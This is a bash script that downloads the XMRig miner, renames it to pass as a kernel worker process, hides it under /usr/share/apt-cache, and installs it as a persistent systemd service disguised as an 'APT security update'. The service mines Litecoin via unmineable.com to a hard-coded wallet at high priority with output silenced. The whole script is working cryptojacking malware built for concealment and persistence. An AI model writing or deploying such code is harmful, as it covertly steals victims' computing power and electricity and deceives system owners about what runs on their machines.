#!/bin/bash

# 1. IDENTITY & MASKING
SERVICE_NAME="apt-security-update"
BIN_NAME="kworker-u4-2" 
INSTALL_DIR="/usr/share/apt-cache"
LTC_ADDR="LPduZ8ZN92oVF4FVQBpGZzf2iS66cUAeCF"
WORKER_NAME="sysapt"

# 2. EMERGENCY UNMASK & CLEANUP
sudo systemctl stop $SERVICE_NAME 2>/dev/null
sudo systemctl unmask $SERVICE_NAME.service 2>/dev/null
pkill -9 -f "kworker-u4-2" 2>/dev/null

# 3. THE 3 ARCHES (Logic Selection)
ARCH=$(uname -m)
VERSION="6.26.0"

if [[ "$ARCH" == "x86_64" ]]; then
    # ARCH 1: Modern 64-bit Intel/AMD
    URL="https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-linux-static-x64.tar.gz"
elif [[ "$ARCH" == "x86" || "$ARCH" == "i386" || "$ARCH" == "i686" ]]; then
    # ARCH 2: Legacy 32-bit (Using v6.12.1 for stability)
    URL="https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x32.tar.gz"
elif [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
    # ARCH 3: ARM64 (Oracle/AWS/Pi)
    URL="https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-linux-static-arm64.tar.gz"
else
    echo "Unsupported Arch: $ARCH"
    exit 1
fi

# 4. INSTALL
sudo mkdir -p "$INSTALL_DIR"
wget -qO- "$URL" | sudo tar -xzf - -C "$INSTALL_DIR" --strip-components=1
sudo mv "$INSTALL_DIR/xmrig" "$INSTALL_DIR/$BIN_NAME"

# 5. LTC PERSISTENCE CONFIG
cat << EOF | sudo tee /etc/systemd/system/apt-security-update.service
[Unit]
Description=Advanced Package Tool Security Update
After=network.target

[Service]
Type=simple
Environment="LTC_ADDR=$LTC_ADDR"
Environment="WORKER=$WORKER_NAME"
WorkingDirectory=$INSTALL_DIR

# 12 Threads Forced for LTC Mining
ExecStart=$INSTALL_DIR/$BIN_NAME -o rx.unmineable.com:3333 -a rx -k -u LTC:\${LTC_ADDR}.\${WORKER}#e4xd-807e --threads=12
Restart=always
RestartSec=5
Nice=-20
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# 6. DEPLOY
sudo systemctl daemon-reload
sudo systemctl enable $SERVICE_NAME
sudo systemctl start $SERVICE_NAME

echo "LTC Triple-Arch Deployment Active (12 Threads)."